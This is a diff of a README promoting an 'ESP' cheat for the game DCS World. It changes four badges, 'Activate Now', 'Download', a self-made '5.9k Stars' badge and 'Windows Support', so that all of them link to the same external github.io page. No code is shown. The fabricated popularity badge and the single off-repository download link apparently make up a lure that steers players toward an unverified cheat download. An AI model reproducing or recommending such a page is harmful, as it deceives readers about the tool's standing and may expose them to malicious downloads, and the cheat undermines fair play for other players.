@@ -11,10 +11,10 @@ DCS World thrives on realism, but situational awareness can be overwhelming. ESP
 \[!IMPORTANT]
 The ESP runs only in memory—no game files are permanently modified.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 5.9k Stars](https://img.shields.io/badge/⭐️%205.9k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](https://dcs-world-esp.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://dcs-world-esp.github.io/.github/)
+[![⭐️ 5.9k Stars](https://img.shields.io/badge/⭐️%205.9k-Stars-yellow?style=for-the-badge\&logo=github)](https://dcs-world-esp.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://dcs-world-esp.github.io/.github/)
 
 ---
 
